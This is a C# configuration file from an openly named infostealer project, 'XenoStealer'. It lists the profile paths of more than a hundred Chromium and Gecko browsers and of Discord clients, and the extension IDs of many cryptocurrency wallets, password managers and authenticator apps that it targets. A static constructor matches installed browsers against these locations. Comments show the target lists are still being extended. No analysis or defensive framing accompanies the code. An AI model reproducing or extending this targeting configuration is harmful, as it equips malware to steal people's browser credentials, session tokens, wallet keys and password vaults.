using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class Configuration
    {
        static Configuration() 
        {
            string[] browsers = Utils.GetInstalledBrowsers();
            foreach (string browser in ChromiumBrowsers.Keys)
            {
                string dataPath = RemoveEnvVarFromPath(ChromiumBrowsers[browser]).ToLower();
                string endName = new DirectoryInfo(dataPath).Name;
                if (endName.Contains("user"))
                {
                    dataPath = dataPath.Substring(0, dataPath.Length - endName.Length - 1); // -1 for the backslash
                }

                // List to store the top 3 results (with library paths and similarity scores)
                List<(string LibraryPath, double Similarity)> topResults = new List<(string, double)>();

                foreach (string LibraryPath in browsers)
                {
                    string filtered = RemoveEnvVarFromPath(Path.GetDirectoryName(LibraryPath)).ToLower();
                    double result = Utils.CalculateStringSimilarity(filtered, dataPath);

                    // If the list has less than 3 results, simply add the new result
                    if (topResults.Count < 3)
                    {
                        topResults.Add((LibraryPath, result));
                    }
                    else
                    {
                        // If the current result is better than the worst in the top 3, replace it
                        var minResult = topResults.OrderBy(x => x.Similarity).First();
                        if (result > minResult.Similarity)
                        {
                            topResults.Remove(minResult); // Remove the worst result
                            topResults.Add((LibraryPath, result)); // Add the new better result
                        }
                    }
                }

                topResults = topResults.OrderByDescending(x => x.Similarity).ToList();

                ChromiumBrowsersLikelyLocations[browser] = topResults.Select(x => x.LibraryPath).ToArray();
            }
        }


        static string RemoveEnvVarFromPath(string path)
        {
            string largestMatch = null;

            // Iterate through all environment variables
            foreach (var envVar in Environment.GetEnvironmentVariables().Keys)
            {
                string envValue = Environment.GetEnvironmentVariable(envVar.ToString());

                if (!string.IsNullOrEmpty(envValue) && path.StartsWith(envValue, StringComparison.OrdinalIgnoreCase))
                {
                    // Check if the current environment variable value is larger than the previous match
                    if (largestMatch == null || envValue.Length > largestMatch.Length)
                    {
                        largestMatch = envValue;
                    }
                }
            }

            // If we found a match, remove it and return the remaining part of the path
            if (largestMatch != null)
            {
                return path.Replace(largestMatch, "").TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
            }

            // If no match found, return the path unchanged
            return path;
        }

        public static readonly string commonAppdata = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
        public static readonly string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public static readonly string roamingAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static string _programFiles = null;
        public static string programFiles
        {
            get
            {
                if (_programFiles != null)
                {
                    return _programFiles;
                }
                string programFiles64Bit = Environment.GetEnvironmentVariable("ProgramW6432");
                if (programFiles64Bit == null || programFiles64Bit == "")
                {
                    programFiles64Bit = "NonExistant";
                }
                _programFiles = programFiles64Bit;
                return _programFiles;
            }
        }
        public static readonly string programFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);

        public static string[] DiscordPaths =
        {
            $"{roamingAppData}\\Discord",
            $"{roamingAppData}\\DiscordCanary",
            $"{roamingAppData}\\DiscordPTB",
            $"{roamingAppData}\\DiscordDevelopment",
            $"{roamingAppData}\\Lightcord"
        };

        public static Dictionary<string, string[]> ChromiumBrowsersLikelyLocations = new Dictionary<string, string[]>
        {

        };

        public static Dictionary<string, string> ChromiumBrowsers = new Dictionary<string, string>
        {
            {"Google Chrome", $"{localAppData}\\Google\\Chrome\\User Data"},
            {"Google Chrome Beta", $"{localAppData}\\Google\\Chrome Beta\\User Data"},
            {"Google Chrome SxS", $"{localAppData}\\Google\\Chrome SxS\\User Data"},
            {"Google Chrome Dev", $"{localAppData}\\Google\\Chrome Dev\\User Data"},
            {"Google Chrome Unstable", $"{localAppData}\\Google\\Chrome Unstable\\User Data"},
            {"Google Chrome Canary", $"{localAppData}\\Google\\Chrome Canary\\User Data"},
            {"Google Chrome (x86)", $"{localAppData}\\Google(x86)\\Chrome\\User Data"},
            {"Google Chrome Beta (x86)", $"{localAppData}\\Google(x86)\\Chrome Beta\\User Data"},
            {"Google Chrome SxS (x86)", $"{localAppData}\\Google(x86)\\Chrome SxS\\User Data"},
            {"Google Chrome Dev (x86)", $"{localAppData}\\Google(x86)\\Chrome Dev\\User Data"},
            {"Google Chrome Unstable (x86)", $"{localAppData}\\Google(x86)\\Chrome Unstable\\User Data"},
            {"Google Chrome Canary (x86)", $"{localAppData}\\Google(x86)\\Chrome Canary\\User Data"},
            {"Chromium", $"{localAppData}\\Chromium\\User Data"},
            {"Microsoft Edge", $"{localAppData}\\Microsoft\\Edge\\User Data"},
            {"Brave Browser", $"{localAppData}\\BraveSoftware\\Brave-Browser\\User Data"},
            {"Epic Privacy Browser", $"{localAppData}\\Epic Privacy Browser\\User Data"},
            {"Amigo", $"{localAppData}\\Amigo\\User Data"},
            {"Vivaldi", $"{localAppData}\\Vivaldi\\User Data"},
            {"Kometa", $"{localAppData}\\Kometa\\User Data"},
            {"Orbitum", $"{localAppData}\\Orbitum\\User Data"},
            {"Mail.Ru Atom", $"{localAppData}\\Mail.Ru\\Atom\\User Data"},
            {"Comodo Dragon", $"{localAppData}\\Comodo\\Dragon\\User Data"},
            {"Torch", $"{localAppData}\\Torch\\User Data"},
            {"Comodo", $"{localAppData}\\Comodo\\User Data"},
            {"360ChromeX", $"{localAppData}\\360ChromeX\\Chrome\\User Data"},
            {"Slimjet", $"{localAppData}\\Slimjet\\User Data"},
            {"360Browser", $"{localAppData}\\360Chrome\\Chrome\\User Data"},

            {"360Browser SE6", $"{roamingAppData}\\360se6\\User Data"},
            {"360Browser SE", $"{roamingAppData}\\360se\\User Data"},

            {"360 Secure Browser", $"{localAppData}\\360Browser\\Browser\\User Data"},
            {"Maxthon3", $"{localAppData}\\Maxthon3\\User Data"},

            {"Maxthon5", $"{roamingAppData}\\Maxthon5\\Users"},

            {"Maxthon", $"{localAppData}\\Maxthon\\User Data"},
            {"QQBrowser", $"{localAppData}\\Tencent\\QQBrowser\\User Data"},
            {"K-Meleon", $"{localAppData}\\K-Melon\\User Data"},
            {"Xpom", $"{localAppData}\\Xpom\\User Data"},
            {"Lenovo Browser", $"{localAppData}\\Lenovo\\SLBrowser"},
            {"Xvast", $"{localAppData}\\Xvast\\User Data"},
            {"Go!", $"{localAppData}\\Go!\\User Data"},
            {"Safer Secure Browser", $"{localAppData}\\Safer Technologies\\Secure Browser\\User Data"},
            {"Sputnik", $"{localAppData}\\Sputnik\\Sputnik\\User Data"},
            {"Nichrome", $"{localAppData}\\Nichrome\\User Data"},
            {"CocCoc Browser", $"{localAppData}\\CocCoc\\Browser\\User Data"},
            {"Uran", $"{localAppData}\\uCozMedia\\Uran\\User Data"},
            {"Chromodo", $"{localAppData}\\Chromodo\\User Data"},
            {"Yandex Browser", $"{localAppData}\\Yandex\\YandexBrowser\\User Data"},
            {"Yandex Browser Canary", $"{localAppData}\\Yandex\\YandexBrowserCanary\\User Data"},
            {"Yandex Browser Dev", $"{localAppData}\\Yandex\\YandexBrowserDeveloper\\User Data"},
            {"Yandex Browser Beta", $"{localAppData}\\Yandex\\YandexBrowserBeta\\User Data"},
            {"Yandex Browser Tech", $"{localAppData}\\Yandex\\YandexBrowserTech\\User Data"},
            {"Yandex Browser SxS", $"{localAppData}\\Yandex\\YandexBrowserSxS\\User Data"},
            {"7Star", $"{localAppData}\\7Star\\7Star\\User Data"},
            {"Chedot", $"{localAppData}\\Chedot\\User Data"},
            {"CentBrowser", $"{localAppData}\\CentBrowser\\User Data"},
            {"Iridium", $"{localAppData}\\Iridium\\User Data"},

            {"Opera Stable", $"{roamingAppData}\\Opera Software\\Opera Stable"},
            {"Opera Neon", $"{roamingAppData}\\Opera Software\\Opera Neon\\User Data"},
            {"Opera Crypto Developer", $"{roamingAppData}\\Opera Software\\Opera Crypto Developer"},
            {"Opera GX", $"{roamingAppData}\\Opera Software\\Opera GX Stable"},

            {"Elements Browser", $"{localAppData}\\Elements Browser\\User Data"},
            {"Citrio", $"{localAppData}\\CatalinaGroup\\Citrio\\User Data"},
            {"Sleipnir5 ChromiumViewer", $"{localAppData}\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"},
            {"QIP Surf", $"{localAppData}\\QIP Surf\\User Data"},
            {"Liebao", $"{localAppData}\\liebao\\User Data"},
            {"Coowon", $"{localAppData}\\Coowon\\Coowon\\User Data"},
            {"ChromePlus", $"{localAppData}\\MapleStudio\\ChromePlus\\User Data"},
            {"Rafotech Mustang", $"{localAppData}\\Rafotech\\Mustang\\User Data"},
            {"Suhba", $"{localAppData}\\Suhba\\User Data"},
            {"TorBro", $"{localAppData}\\TorBro\\Profile"},
            {"RockMelt", $"{localAppData}\\RockMelt\\User Data"},
            {"Bromium", $"{localAppData}\\Bromium\\User Data"},
            {"Twinkstar", $"{localAppData}\\Twinkstar\\User Data"},
            {"iTop Private Browser", $"{localAppData}\\iTop Private Browser\\User Data"},
            {"CCleaner Browser", $"{localAppData}\\CCleaner Browser\\User Data"},
            {"AcWebBrowser", $"{localAppData}\\AcWebBrowser\\User Data"},
            {"CoolNovo", $"{localAppData}\\CoolNovo\\User Data"},
            {"Baidu Spark", $"{localAppData}\\Baidu Spark\\User Data"},
            {"SRWare Iron", $"{localAppData}\\SRWare Iron\\User Data"},
            {"Titan Browser", $"{localAppData}\\Titan Browser\\User Data"},
            {"AVAST Browser", $"{localAppData}\\AVAST Software\\Browser\\User Data"},
            {"AVG Browser", $"{localAppData}\\AVG\\Browser\\User Data"},
            {"UCBrowser", $"{localAppData}\\UCBrowser\\User Data_i18n"},
            {"URBrowser", $"{localAppData}\\UR Browser\\User Data"},
            {"Blisk", $"{localAppData}\\Blisk\\User Data"},
            {"Flock", $"{localAppData}\\Flock\\User Data"},
            {"CryptoTab Browser", $"{localAppData}\\CryptoTab Browser\\User Data"},
            {"Sidekick", $"{localAppData}\\Sidekick\\User Data"},
            {"SwingBrowser", $"{localAppData}\\SwingBrowser\\User Data"},
            {"Superbird", $"{localAppData}\\Superbird\\User Data"},
            {"SalamWeb", $"{localAppData}\\SalamWeb\\User Data"},
            {"GhostBrowser", $"{localAppData}\\GhostBrowser\\User Data"},
            {"NetboxBrowser", $"{localAppData}\\NetboxBrowser\\User Data"},
            {"GarenaPlus", $"{localAppData}\\GarenaPlus\\User Data"},
            {"Kinza", $"{localAppData}\\Kinza\\User Data"},
            {"InsomniacBrowser", $"{localAppData}\\InsomniacBrowser\\User Data"},
            {"ViaSat Browser", $"{localAppData}\\ViaSat\\Viasat Browser\\User Data"},
            {"Naver Whale", $"{localAppData}\\Naver\\Naver Whale\\User Data"},
            {"Falkon", $"{localAppData}\\falkon\\profiles"},


            {"Sogou", $"{roamingAppData}\\SogouExplorer\\Webkit"}
        };
        public static Dictionary<string, string> GeckoBrowsers = new Dictionary<string, string>//add librewolf and mercury
        {
            {"Firefox", $"{roamingAppData}\\Mozilla\\Firefox\\Profiles"},
            {"SeaMonkey", $"{roamingAppData}\\Mozilla\\SeaMonkey\\Profiles"},
            {"Waterfox", $"{roamingAppData}\\Waterfox\\Profiles"},
            {"Waterfox Classic", $"{roamingAppData}\\Waterfox\\Profiles"},
            {"K-Meleon", $"{roamingAppData}\\K-Meleon\\Profiles"},
            {"Thunderbird", $"{roamingAppData}\\Thunderbird\\Profiles"},
            {"IceDragon", $"{roamingAppData}\\Comodo\\IceDragon\\Profiles"},
            {"Cyberfox", $"{roamingAppData}\\8pecxstudios\\Cyberfox\\Profiles"},
            {"BlackHawk", $"{roamingAppData}\\NETGATE Technologies\\BlackHawk\\Profiles"},
            {"Pale Moon", $"{roamingAppData}\\Moonchild Productions\\Pale Moon\\Profiles"},
            {"Basilisk", $"{roamingAppData}\\Moonchild Productions\\Basilisk\\Profiles"},
            {"BitTube", $"{roamingAppData}\\BitTube\\BitTubeBrowser\\Profiles"},
            {"SlimBrowser", $"{roamingAppData}\\FlashPeak\\SlimBrowser\\Profiles"},
        };



        public static Dictionary<string, string> ChromiumCryptoExtensions = new Dictionary<string, string>
        {// need to add some more
            {"SafePal", "lgmpcpglpngdoalbgeoldeajfclnhafa"},
            {"Pontem Aptos Wallet", "phkbamefinggmakgklpkljjmgibohnba"},
            {"xverse.app", "idnnbdplmphpflfnlkomgpfbpcgelopg"},
            {"Rainbow", "opfgelmcmbiajamepnmloijbpoleiama"},
            {"LastPass", "hdokiejnpimakedhajhdlcegeplioahd"},
            {"Elli-Sui Wallet", "ocjdpmoallmgmjbbogfiiaofphbjgchh"},
            {"Opera Wallet", "gojhcdgcpbpfigcaejpfhfegekdgiblk"},
            {"Petra Aptos Wallet", "ejjladinnckdgjemekebdpeokbikhfci"},
            {"Hashpack", "gjagmgiddbbciopjhllkdnddhcglnemk"},
            {"zkPass TransGate", "afkoofjocpbclhnldmmaphappihehpma"},
            {"Blade-Hedera Web3 Digital Wallet", "abogmiocnneedmmepnohnhlijcjpcifd"},
            {"Leap Cosmos Wallet", "fcfcfllfndlomdhbehjjcoimbgofdncg"},
            {"Frontier Wallet", "kppfdiipphfccemcignhifpjkapfbihd"},
            //{"Keeper Password Manager", "bfogiafebfohielmmehodmfbbebbbpei"},
            {"Coinhub", "jgaaimajipbpdogpdglhaphldakikgef"},
            //{"authenticator.cc", "bhghoamapcdpbohphigoooaddinpkbai"},
            {"Klever Wallet", "ifclboecfhkjbpmhgehodcjpciihhmif"},
            //{"bitwarden", "nngceckbapebfimnlniiiahkandclblb"},
            //{"RoboForm", "pnlccmojcmeohlpggmfnbbiapkmbliob"},
            {"Glass wallet-Sui wallet", "loinekcabhlmhjjbocijdoimmejangoa"},
            {"MultiversX DeFi Wallet", "dngmlblcodfobpdpecaadgfbcggfjfnm"},
            {"Fewcha Move Wallet", "ebfidpplhabeedpnhjnobghokpiioolj"},
            {"Fluvi Wallet", "mmmjbcfofconkannjonfmjjajpllddbg"},
            {"HAVAH Wallet", "cnncmdhjacpkmjmkcafchppbnpnhdmon"},
            {"SubWallet - Polkadot Wallet", "onhogfjeacnfoofkfgppdlbmlmnplgbn"},
            //{"MultiPassword", "cnlhokffphohmfcddnibpohmkdfafdli"},
            {"compass-wallet-for-sei", "anokgmphncpekkhclmingpimjmcooifb"},
            //{"1Password-fox", "aeblfdkhhhdcdjpifhhbdiojplfjncoa"},
            //{"Dashlane", "fdjamakpfbbddfjaooikfcpapjohcfmg"},
            {"Rise - Aptos Wallet", "hbbgbephgojikajhfbomhlmmollphcad"},
            {"Morphis Wallet", "heefohaffomkkkphnlpohglngmbcclhi"},
            {"BitPay", "jkjgekcefbkpogohigkgooodolhdgcda"},
            {"Venom Wallet", "ojggmchlghnjlapmfbnjholfjkiidbch"},
            {"TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"},
            {"MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"},
            {"Exodus", "aholpfdialjgjfhomihkjbmgjidlcdno"},
            {"Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"},
            {"Braavos Smart Wallet", "jnlgamecbpmbajjfhmmmlhejkemejdma"},
            {"Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb"},
            {"Binance Chain Wallet", "fhbohimaelbohpjbbldcngcnapndodjp"},
            {"Jaxx Liberty", "aiaifbiceejhhkfbjdgonjgljkpcdhch"},
            {"iWallet", "kncchdigobghenbbaddojjnnaogfppfj"},
            {"Terra Station", "aiifbnbfobpmeekipheeijimdpnlpgpp"},
            {"EQUAL Wallet", "hifafgmccdpekplomjjkcfgodnhcellj"},
            {"Wombat", "amkmjjmmflddogmhpjloimipbofnfjih"},
            {"Nifty Wallet", "jnldfbidonfeldmalbflbmlebbipcnle"},
            {"Math Wallet", "afbcbjpbpfadlkmhmclhkeeodmamcflc"},
            {"Guarda", "hpglfhgfnhbgpjdenjgmdgoeiappafln"},
            {"Coin98 Wallet", "aeachknmefphepccionboohckonoeemg"},
            //{"Trezor Password Manager", "lgbjhdkjmpgjgcbcdlhkokkckpjmedgc"},
            //{"EOS Authenticator", "fpabdmjmldajnkijknogckkhlmbnfiog"},
            //{"Authy", "gaedmjdfmmahhbjefcbgaolhhanlaolb"},
            //{"Authenticator", "bhghoamapcdpbohphigoooaddinpkbai"},
            {"TezBox", "mnfifefkajgofkcjkemidiaecocnkjeh"},
            {"Cyano Wallet", "dkdedlpgdmmkkfjabffeganieamfklkm"},
            {"BitKeep", "jiidiaalihmmhddjgbnbgdfflelocpak"},
            {"Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad"},
            {"Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
            {"MOBOX WALLET", "fcckkdbjnoikooededlapcalpionmalo"},
            {"XDCPay", "bocpokimicclpaiekenaeelehdjllofo"},
            {"Solana Wallet", "bhhhlbepdkbapadjdnnojkbgioiodbic"},
            {"Swash", "cmndjbecilbocjfkibfbifhngkdmjgog"},
            {"Finnie", "cjmkndjhnagcfbpiemnkdpomccnjblmj"},
            {"Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"},
            {"Liquality Wallet", "kpfopkelmapcoipemfendmdcghnegimn"},
            {"Rabet", "hgmoaheomcjnaheggkfafnjilfcefbmo"},
            {"Ronin Wallet", "fnjhmkhhmkbjkkabndcnnogagogbneec"},
            {"ZilPay", "klnaejjgbibmhlephnhpmaofohgkpgkd"},
            //{"GAuth Authenticator", "ilgcnhelpchnceeipipijaljkblbcobl"},
            {"XDEFI Wallet", "hmeobnfnfcmdkdcmlblgagmfpfboieaf"},
            {"Waves Keeper", "lpilbniiabackdjcionkobglmddfbcjo"},
            {"GreenAddress", "gflpckpfdgcagnbdfafmibcmkadnlhpj"},
            {"Sollet", "fhmfendgdocmcbmfikdcogofphimnkno"},
            {"ICONex", "flpiciilemghbmfalicajoolhkkenfel"},
            {"MEW CX", "nlbmnnijcnlegkjjpcfjclmcfggfefdm"},
            {"NeoLine", "cphhlgmgameodnhkjdmkpanlelnlohao"},
            {"KHC", "hcflpincpppdclinealmandijcmnkbgn"},
            {"Byone", "nlgbhdfgdhgbiamfdfmbikcdghidoadd"},
            {"OneKey", "ilbbpajmiplgpehdikmejfemfklpkmke"},
            {"MetaWallet", "pfknkoocfefiocadajpngdknmkjgakdg"},
            {"Atomic Wallet", "bhmlbgebokamljgnceonbncdofmmkedg"},
            {"Electrum", "hieplnfojfccegoloniefimmbfjdgcgp"},
            {"Mycelium", "pidhddgciaponoajdngciiemcflpnnbg"},
            {"Coinomi", "blbpgcogcoohhngdjafgpoagcilicpjh"},
            {"Edge", "doljkehcfhidippihgakcihcmnknlphh"},
            {"BRD", "nbokbjkelpmlgflobbohapifnnenbjlh"},
            {"Samourai Wallet", "apjdnokplgcjkejimjdfjnhmjlbpgkdi"},
            {"Bread", "jifanbgejlbcmhbbdbnfbfnlmbomjedj"},
            {"KeepKey", "dojmlmceifkfgkgeejemfciibjehhdcl"},
            {"Ledger Live", "pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln"},
            {"Ledger Wallet", "hbpfjlflhnmkddbjdchbbifhllgmmhnm"},
            {"Bitbox", "ocmfilhakdbncmojmlbagpkjfbmeinbd"},
            {"Digital Bitbox", "dbhklojmlkgmpihhdooibnmidfpeaing"}
        };

        public static Dictionary<string, string> EdgeCryptoExtensions = new Dictionary<string, string>
        {
            {"SafePal", "apenkfbbpmhihehmihndmmcdanacolnh"},
            {"Rainbow", "cpojfbodiccabbabgimdeohkkpjfpbnf"},
            //{"LastPass", "bbcinlkgjjkejfdpemiealijmmooekmp"},
            //{"Keeper Password Manager", "lfochlioelphaglamdcakfjemolpichk"},
            //{"authenticator.cc", "ocglkepbibnalbgmbachknglpdipeoio"},
            //{"bitwarden", "jbkfoedolllekgbhcbcoahefnbanhhlh"},
            //{"RoboForm", "ljfpcifpgbbchoddpjefaipoiigpdmag"},
            {"Dashlane", "gehmmocbbkpblljhkekmfhjpfbkclbph"},
            {"MetaMask", "ejbalbakoplchlghecdalmeeeajnimhm"},
            {"Braavos Smart Wallet", "hkkpjehhcnhgefhbdcgfkeegglpjchdc"},
            {"Yoroi", "akoiaibnepcedcplijmiamnaigbepmcb"},
            {"Binance Chain Wallet", "mlbafbjadjidklbhgopoamemfibcpdfi"},
            {"Terra Station", "ajkhoeiiokighlmdnlakpjfoobnjinie"},
            {"EQUAL Wallet", "nggcakhlblakghejdigkaekbhicfkckn"},
            {"Wombat", "oemdnnhhfhdhilalibobndhoahcaiboe"},
            {"Math Wallet", "dfeccadlilpndjjohbjdblepmjeahlmm"},
            //{"Authy", "ocglkepbibnalbgmbachknglpdipeoio"},
            //{"Authenticator", "ocglkepbibnalbgmbachknglpdipeoio"},
            {"TezBox", "iaociiajffacjhhmleclkjdchjhdmjpb"},
            {"Keplr", "ocodgmmffbkkeecmadcijjhkmeohinei"},
            {"Ronin Wallet", "kjmoohlgokccodicjjfebfomlbljgfhk"},
            //{"GAuth Authenticator", "ocglkepbibnalbgmbachknglpdipeoio"},
            {"Waves Keeper", "nkaemodamjfefjgbefolnpnlccpdfpap"}
        };

        public static Dictionary<string, string> ChromePasswordManagerExtensions = new Dictionary<string, string>
        {
            {"Keeper Password Manager", "bfogiafebfohielmmehodmfbbebbbpei"},
            {"RoboForm", "pnlccmojcmeohlpggmfnbbiapkmbliob"},
            {"MultiPassword", "cnlhokffphohmfcddnibpohmkdfafdli"},
            {"1Password-fox", "aeblfdkhhhdcdjpifhhbdiojplfjncoa"},
            {"Dashlane", "fdjamakpfbbddfjaooikfcpapjohcfmg"},
            {"DualSafe Password Manager", "lgbjhdkjmpgjgcbcdlhkokkckpjmedgc"},
            {"Trezor Password Manager", "imloifkgjagghnncjkhggdhalmcnfklk"},
            {"Authy", "gaedmjdfmmahhbjefcbgaolhhanlaolb"},
            {"Authenticator", "bhghoamapcdpbohphigoooaddinpkbai"},
            {"GAuth Authenticator", "ilgcnhelpchnceeipipijaljkblbcobl"},
            {"EOS Authenticator", "oeljdldpnmdbchonielidgobddffflal"},
            {"KeePassXC", "oboonakemofpalcgghocfoadofidjkkk"},
            {"Bitwarden", "nngceckbapebfimnlniiiahkandclblb"},
            {"NordPass", "fooolghllnmhmmndgjiamiiodkpenpbb"},
            {"Keeper", "bfogiafebfohielmmehodmfbbebbbpei"},
            {"LastPass", "hdokiejnpimakedhajhdlcegeplioahd"},
            {"BrowserPass", "naepdomgkenhinolocfifgehidddafch"},
            {"MYKI", "bmikpgodpkclnkgmnpphehdgcimmided"},
            {"Splikity", "jhfjfclepacoldmjmkmdlmganfaalklb"},
            {"CommonKey", "chgfefjpcobfbnpmiokfjjaglahmnded"},
            {"SAASPASS", "nhhldecdfagpbfggphklkaeiocfnaafm"},
            {"Telos Authenticator", "fpabdmjmldajnkijknogckkhlmbnfiog"},
            {"Zoho Vault", "igkpcodhieompeloncfnbekccinhapdb"},
            {"Norton Password Manager", "admmjipmmciaobhojoghlmleefbicajg"},
            {"Avira Password Manager", "caljgklbbfbcjjanaijlacgncafpegll"},
            {"Aegis Authenticator", "ppdjlkfkedmidmclhakfncpfdmdgmjpm"},
            {"LastPass Authenticator", "cfoajccjibkjhbdjnpkbananbejpkkjb"},
            {"KeePass", "lbfeahdfdkibininjgejjgpdafeopflb"},
            {"Duo Mobile", "eidlicjlkaiefdbgmdepmmicpbggmhoj"},
            {"OTP Auth", "bobfejfdlhnabgglompioclndjejolch"},
            {"FreeOTP", "elokfmmmjbadpgdjmgglocapdckdcpkn"},
        };

        public static Dictionary<string, string> EdgePasswordManagerExtensions = new Dictionary<string, string>
        {
            {"LastPass", "bbcinlkgjjkejfdpemiealijmmooekmp"},
            {"Keeper Password Manager", "lfochlioelphaglamdcakfjemolpichk"},
            {"bitwarden", "jbkfoedolllekgbhcbcoahefnbanhhlh"},
            {"RoboForm", "ljfpcifpgbbchoddpjefaipoiigpdmag"},
            {"Authy", "ocglkepbibnalbgmbachknglpdipeoio"},
            {"Authenticator", "ocglkepbibnalbgmbachknglpdipeoio"},
            {"GAuth Authenticator", "ocglkepbibnalbgmbachknglpdipeoio"},
            {"1Password", "dppgmdbiimibapkepcbdbmkaabgiofem"},
            {"KeePassXC", "pdffhmdngciaglkoonimfcmckehcpafo"},
            {"Dashlane", "gehmmocbbkpblljhkekmfhjpfbkclbph"},
            {"MYKI", "nofkfblpeailgignhkbnapbephdnmbmn"},
        };

    }
}
